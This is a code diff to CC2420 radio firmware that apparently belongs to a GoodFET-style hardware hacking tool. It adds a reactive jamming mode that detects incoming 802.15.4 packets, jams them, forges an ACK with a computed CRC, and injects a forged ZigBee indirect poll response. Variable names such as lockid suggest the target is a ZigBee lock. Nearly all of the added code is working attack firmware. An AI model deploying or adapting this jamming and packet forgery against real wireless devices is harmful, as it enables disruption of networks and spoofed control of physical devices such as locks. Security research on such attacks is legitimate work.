@@ -97,7 +97,9 @@ void ccspireflexjam(u16 delay){
   prep_timer();
   debugstr("Reflex jamming until reset.");
   debughex(delay);
-  txdata(CCSPI,CCSPI_REFLEX,1);  //Let the client continue its business.
+  debugstr("@mknight!");
+//  txdata(CCSPI,CCSPI_REFLEX,1);  //Let the client continue its business.
+  debugstr("@mknight ready!");
   while(1) {
     //Wait until a packet is received
     while(!SFD){
@@ -143,6 +145,7 @@ void ccspireflexjam(u16 delay){
     ccspitrans8(0x09); //SFLUSHTX
     SETSS;
     
+    debugstr("@mknight jammed");
     
     //Turn off LED 2 (green) as signal
     PLED2DIR |= PLED2PIN;
@@ -521,6 +524,190 @@ void ccspi_handle_fn( uint8_t const app,
         //Turn off LED 2 (green) as signal
 	PLED2DIR |= PLED2PIN;
 	PLED2OUT |= PLED2PIN;
+    }
+    //TODO the firmware stops staying in this mode after a while, and stops jamming... need to find a fix.
+#else
+    debugstr("Can't reflexively jam without SFD, FIFO, FIFOP, and P2LEDx definitions - try using telosb platform.");
+    txdata(app,NOK,0);
+#endif
+    break;
+
+  case CCSPI_REFLEX_INDIRECT:
+#if defined(FIFOP) && defined(SFD) && defined(FIFO) && defined(PLED2DIR) && defined(PLED2PIN) && defined(PLED2OUT)
+    debugstr("Indirect");
+//    txdata(app, verb, len);
+    char seqnum;
+    char panid[2];
+    char lockid[2];
+    char coordid[2];
+    while(1) {
+        //Has there been an overflow in the RX buffer?
+        if((!FIFO)&&FIFOP){
+          //debugstr("Clearing overflow");
+          CLRSS;
+          ccspitrans8(0x08); //SFLUSHRX
+          SETSS;
+        }
+
+        //Wait until a packet is received
+        while(!SFD);
+        //Turn on LED 2 (green) as signal
+	    PLED2DIR |= PLED2PIN;
+	    PLED2OUT &= ~PLED2PIN;
+
+        //Put radio in TX mode
+        //Note: Not doing this slows down jamming, so can't jam short packets.
+        //      However, if we do this, it seems to mess up our RXFIFO ability.
+        //CLRSS;
+        //ccspitrans8(0x04);
+        //SETSS;
+
+        //Load the jamming packet
+        CLRSS;
+        ccspitrans8(CCSPI_TXFIFO);
+        char pkt[7] = {0x07, 0x01, 0x08, 0xff, 0xff, 0xff, 0xff};
+        for(i=0;i<pkt[0];i++)
+          ccspitrans8(pkt[i]);
+        SETSS;
+        //Transmit the jamming packet
+        CLRSS;
+        ccspitrans8(0x04);  //STXON
+        SETSS;
+        while(!SFD);        // Wait for TX to complete
+        while(SFD);
+        msdelay(1);         // 1ms is too long, but delay_us is finnicky.  This will catch a retry.
+        //delay_us(400);  // data rate 32us/byte, jam kicks in around ~7th byte of 12 byte long MPDU
+        //Flush TX buffer.
+        CLRSS;
+        ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
+
+        //Create the forged ACK packet
+        cmddata[0] = 6;     //length of ack frame plus length
+        cmddata[1] = 0x12;  //first byte of FCF -- 0x1X is frame pending flag
+        cmddata[2] = 0x00;  //second byte of FCF
+        //[3] is already filled with the sequence number
+        int crc = 0;
+        for(i=1;i<4;i++) {
+            int c = cmddata[i];
+            int q = (crc ^ c) & 15;   		//Do low-order 4 bits
+            crc = (crc / 16) ^ (q * 4225);
+            q = (crc ^ (c / 16)) & 15;		//And high 4 bits
+            crc = (crc / 16) ^ (q * 4225);
+        }
+        cmddata[4] = crc & 0xFF;
+        cmddata[5] = (crc >> 8) & 0xFF;
+
+        //Load the forged ACK packet
+        CLRSS;
+        ccspitrans8(CCSPI_TXFIFO);
+        for(i=0;i<cmddata[0];i++)
+          ccspitrans8(cmddata[i]);
+        SETSS;
+        //Transmit the forged ACK packet
+        while(SFD);
+        CLRSS;
+        ccspitrans8(0x04);  //STXON
+        SETSS;
+        while(!SFD);        // Wait for TX to complete
+        while(SFD);
+        msdelay(100);       // MAGIC arbitrary delay to prevent stepping on ack: TODO shorten appropriately
+        //msdelay(1000);
+        //Flush TX buffer
+        CLRSS;
+        ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
+
+        //LED 1 (yellow)
+	PLEDDIR |= PLEDPIN;
+	PLEDOUT &= ~PLEDPIN;
+
+        // Forge an indirect poll response packet
+        cmddata[0] = 48;          // length
+        cmddata[1] = 0x61;        // fcs1
+        cmddata[2] = 0x88;        // fcs0
+        cmddata[3] = 0xab;        // sequence number
+        cmddata[4] = 0xab;
+        cmddata[5] = 0x3e;
+        cmddata[6] = 0xbe;
+        cmddata[7] = 0xbc;
+        cmddata[8] = 0x00;
+        cmddata[9] = 0x00;
+        cmddata[10] = 0x48;       // zigbee frame header
+        cmddata[11] = 0x02;
+        cmddata[12] = 0xbe;
+        cmddata[13] = 0xbc;
+        cmddata[14] = 0x00;
+        cmddata[15] = 0x00;
+        cmddata[16] = 0x1e;
+        cmddata[17] = 0xdb;
+        cmddata[18] = 0x28;
+        cmddata[19] = 0x6f;
+        cmddata[20] = 0x40;
+        cmddata[21] = 0x02;
+        cmddata[22] = 0x00;
+        cmddata[23] = 0x01;
+        cmddata[24] = 0x00;
+        cmddata[25] = 0xb8;
+        cmddata[26] = 0x13;
+        cmddata[27] = 0x17;
+        cmddata[28] = 0xa8;
+        cmddata[29] = 0x52;
+        cmddata[30] = 0xd0;
+        cmddata[31] = 0x00;
+        cmddata[32] = 0x72;
+        cmddata[33] = 0x31;
+        cmddata[34] = 0x8b;
+        cmddata[35] = 0xc5;
+        cmddata[36] = 0xce;
+        cmddata[37] = 0x54;
+        cmddata[38] = 0xfb;
+        cmddata[39] = 0x33;
+        cmddata[40] = 0x33;
+        cmddata[41] = 0xd9;
+        cmddata[42] = 0xa9;
+        cmddata[43] = 0x67;
+        cmddata[44] = 0x0f;
+        cmddata[45] = 0x3f;
+        cmddata[46] = 0xc2;
+        cmddata[47] = 0x38;
+        cmddata[48] = 0x8e;
+
+        //msdelay(1000);       //TODO try doing this based on SFD line status instead
+
+        //Load the forged indirect response packet
+        CLRSS;
+        ccspitrans8(CCSPI_TXFIFO);
+        for(i=0;i<cmddata[0]+4;i++)  // Sending a few extra, otherwise the FCS gets garbled...
+          ccspitrans8(cmddata[i]);
+        SETSS;
+        //Transmit the forged indirect poll response packet
+        CLRSS;
+        ccspitrans8(0x04);  //STXON
+        SETSS;
+        while(!SFD);        // Wait for TX to complete
+        while(SFD);
+        //Flush TX buffer
+        CLRSS;
+        ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
+
+        //TODO disable AUTOCRC here again to go back to promiscous mode
+
+        debugbytes(panid, 2);
+        debugbytes(coordid, 2);
+        debugbytes(lockid, 2);
+        for(i=0;i<cmddata[0]+1;i++) {
+            itoa(cmddata[i], byte, 16);
+            debugstr(byte);
+        }
+
+        //Turn off LED 2 (green) as signal
+	PLED2DIR |= PLED2PIN;
+	PLED2OUT |= PLED2PIN;
+        //LED 1 (yellow)
+	PLEDDIR |= PLEDPIN;
+	PLEDOUT |= PLEDPIN;
     }
     //TODO the firmware stops staying in this mode after a while, and stops jamming... need to find a fix.
 #else
